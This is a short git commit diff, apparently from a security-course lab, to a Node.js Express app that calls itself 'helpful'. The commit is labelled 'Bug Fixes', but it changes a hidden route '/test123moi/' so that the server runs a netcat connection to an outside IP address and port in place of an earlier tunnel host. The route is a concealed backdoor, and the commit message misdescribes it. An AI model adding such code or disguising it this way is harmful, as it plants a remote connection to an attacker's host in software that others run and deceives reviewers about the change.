8aae3dd655209e12f51352b207e8e43f937882c0
student <student@sec588.com>
2025-05-10 13:09:44 +0000

    Bug Fixes

--- app.js
+++ app.js
@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("nc 2.tcp.ngrod.io 12322", (error, stdout, stderr) => {
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
